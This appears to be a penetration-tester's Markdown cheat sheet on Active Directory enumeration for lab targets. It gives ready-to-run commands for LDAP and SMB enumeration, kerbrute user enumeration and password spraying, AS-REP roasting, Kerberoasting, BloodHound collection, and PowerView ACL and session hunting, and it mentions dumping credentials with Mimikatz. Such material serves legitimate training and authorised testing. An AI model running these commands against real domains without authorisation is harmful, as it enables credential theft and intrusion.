---
layout: default
title: "AD Enumeration"
parent: "Active Directory"
nav_order: 2
---

# Active Directory Enumeration

## Methodology Overview

After an nmap scan on a machine with Active Directory (AD), prioritize enumeration of key services:

1. **SMB (Port 445):** First point of focus. Look for open shares (`smbclient`, `enum4linux`, `smbmap`), weak permissions, Null Sessions, or anonymous access. Check for sensitive info and credentials in shared folders/config files.
2. **LDAP (Port 389/636):** Enumerate users and groups, especially if anonymous bind is allowed. Tools like `ldapsearch` or `enum4linux` help gather domain info. Check description fields for passwords.
3. **Kerberos (Port 88):** Use `kerbrute` or `GetNPUsers.py` for username enumeration and AS-REP roasting. Enumerate SPNs using `GetUserSPNs.py` for Kerberoasting.
4. **RPC (Port 135/139):** Attempt to enumerate users and shares using `rpcclient`.
5. **DNS (Port 53):** Check if zone transfers are allowed (`dig axfr` or `host -l`).

**Always add the DC's DNS name to `/etc/hosts`:**
- Both `dc.domain.com` AND `domain.com`

**Tricks that often work:**
- Password Spraying: Once you have usernames, test weak/common passwords with `crackmapexec` or `nxc`.
- If you find a valid username, try AS-REP Roast immediately.
- If anonymous bind is established, search for passwords in description fields.
- Check for NTLM credential leaks via various methods.
- Look for creds in SMB shares and login scripts; check for GPP Passwords in SYSVOL.
- If you have credentials/hash, repeat enumeration steps to see what that account can access.
- Find accounts with SPN set and try Kerberoasting.
- Run BloodHound for domain mapping.
- Run winPEAS for non-AD escalation paths.
- If you escalate to local admin/SYSTEM, dump cached creds with Mimikatz.

---

## LDAP Enumeration

If LDAP is open and nothing else is found:
```bash
sudo nmap -sC -A -Pn --script "*ldap*" $IP -oN output.ldap
```

### ldapsearch

Base enumeration — find naming contexts first:
```bash
ldapsearch -H ldap://monitored.htb -x -s base namingcontexts
ldapsearch -H ldap://monitored.htb -x -b "dc=monitored,dc=htb"
```

Anonymous bind search:
```bash
ldapsearch -x -H ldap://$IP -b "dc=$name,dc=offsec" > $name.ldapsearch
# grep for: cn / description / sAMAccountName
```

Authenticated search:
```bash
ldapsearch -x -H ldap://172.16.227.10 -D '$domain.com\$user' -w '$password' -b "DC=$domain,DC=com"
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Full example with `-W` password prompt:
```bash
ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "*"
ldapsearch -x -b "dc=support,dc=htb" -H ldap://support.htb -D ldap@support.htb -W "(objectClass=user)"
```

Parameter reference:
- `-x` — simple authentication (no SASL)
- `-b` — base DN for search
- `-H` — LDAP server URI
- `-D` — bind DN (identity to authenticate with)
- `-W` — prompt for password
- `"*"` — return all entries in base DN

### ldapdomaindump
```bash
ldapdomaindump -u $domain.com\\ldap -p '$ldapPassword' $domain.com -o $outputDirectory
sudo ldapdomaindump ldaps://$dcIP -u '$Domain\$user' -p $Password
```
Outputs HTML files viewable with `firefox file.html`.

### windapsearch
```bash
python3 windapsearch.py --dc-ip $dcIP -u $user@domain.com -p $pass --da
# --da = enumerate domain admins
# -PU  = enumerate privileged users
```

### nmap LDAP scripts
```bash
nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>
```

---

## Kerberos Enumeration

### Kerbrute User Enumeration
```bash
kerbrute userenum --dc $ip -d CONTROLLER.local Users.txt
kerbrute userenum --dc $ip -d CONTROLLER.local /home/kali/Documents/User.txt
# --dc can point to a domain name or IP
```

### Check for AS-REP Roastable Accounts (No Pre-Auth)
If you have a username but no password, try AS-REP Roasting immediately.

Remote via Impacket:
```bash
impacket-GetNPUsers -dc-ip $IP -request -outfile $outfile.asreproast $domain.com/$user
```

Local via Rubeus:
```powershell
.\Rubeus.exe asreproast /nowrap
```

Local enum via PowerView:
```powershell
Get-DomainUser -PreauthNotRequired
```

---

## User Enumeration (Kerbrute, RPC)

### Kerbrute Password Spraying (also finds valid users)
```bash
./kerbrute_linux_arm64 passwordspray -d $domain.com $usersFile "$password"
```

### RPC User Enumeration
```bash
rpcclient -U "" -N $IP
  enumdomusers
  querygroup 0x200
  querygroupmem 0x200
  queryuser 0x1f4
```

### Impacket SID Lookup
```bash
impacket-lookupsid [domain]/[user]:[password/hash]@[Target IP]
```

### enum4linux
```bash
enum4linux -u "" -p "" -a <DC IP>
enum4linux -u "guest" -p "" -a <DC IP>
```

### SMB-based enumeration
```bash
smbmap -u "" -p "" -P 445 -H <DC IP>
smbmap -u "guest" -p "" -P 445 -H <DC IP>
smbclient -U '%' -L //<DC IP>
smbclient -U 'guest%' -L //
```

---

## BloodHound / Domain Mapping

### BloodHound (remote collection from attacker machine)
```bash
bloodhound-python -u $user -p '$password' -ns $ip -d domain.offsec -c all
```

### adPEAS.ps1 (local, on target)
```powershell
Import-Module .\adPEAS.ps1
Invoke-adPEAS
```
- Searches for SPNs, Kerberoastable accounts, exports domain info as .zip for BloodHound.
- Transfer .zip back to attacker machine; before launching BloodHound: `sudo neo4j console`

### Plumhound (companion to BloodHound)
```bash
sudo python3 Plumhound.py -x tasks/default.tasks -p $neo4jpassword
sudo python3 Plumhound.py --easy -p $neo4jpassword   # minimal test
```
Requires neo4j and BloodHound to already be running. Output viewable via `index.html`.

### Snaffler (hunt shares for interesting files)
```bash
Snaffler.exe -s -d $domain.com -o snaffler.log -v data
```

### PowerView.ps1 Domain Enumeration
```powershell
Import-Module .\PowerView.ps1
# (May need: Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser)

Get-NetDomain
Get-NetUser
Get-NetUser | select cn
Get-NetUser | select cn,pwdlastset,lastlogon
Get-NetGroup | select cn
Get-NetGroup "Group Name" | select member
Get-NetComputer
Get-ObjectAcl -Identity $user
Get-ObjectAcl -Identity "<group>" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
Convert-SidToName $SID
Find-LocalAdminAccess
Get-NetSession -ComputerName $computerName
Get-Acl -Path HKLM:SYSTEM\CurrentControlSet\Services\LanmanServer\DefaultSecurity\ | fl
Get-NetUser -SPN | select samaccountname,serviceprincipalname
Find-DomainShare
ls \\dc1.corp.com\sysvol\corp.com\
Get-DomainUser -PreauthNotRequired
Get-DomainPolicy
```

### ActiveDirectory Module (built-in PowerShell)
```powershell
Import-Module ActiveDirectory
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "$groupName"
Get-ADGroupMember -Identity "$groupName"
Get-ADUser -Filter {SamAccountName -eq "$user"} -Properties ServicePrincipalNames
```
